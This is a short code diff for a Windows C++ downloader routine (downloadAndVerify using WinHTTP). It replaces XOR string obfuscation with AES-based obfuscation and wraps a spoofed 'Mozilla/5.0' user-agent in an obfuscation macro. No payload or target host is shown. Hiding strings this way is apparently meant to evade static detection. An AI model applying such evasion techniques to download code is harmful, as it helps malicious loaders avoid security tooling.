@@ -6,7 +6,7 @@
 #include <winhttp.h>
 #include <string>
 #include <vector>
-#include "../security/xor.h"
+#include "../util/aes_string.hpp"
 
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "winhttp.lib")
@@ -106,7 +106,7 @@ inline bool downloadAndVerify(const std::string& url, const std::string& destPat
     std::wstring wPath(path.begin(), path.end());
 
     // Open session
-    HINTERNET session = WinHttpOpen(_xorw_(L"Mozilla/5.0"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
+    HINTERNET session = WinHttpOpen(OBFUSCATE_WSTRING(L"Mozilla/5.0").c_str(), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
     if (!session)
         return false;
 
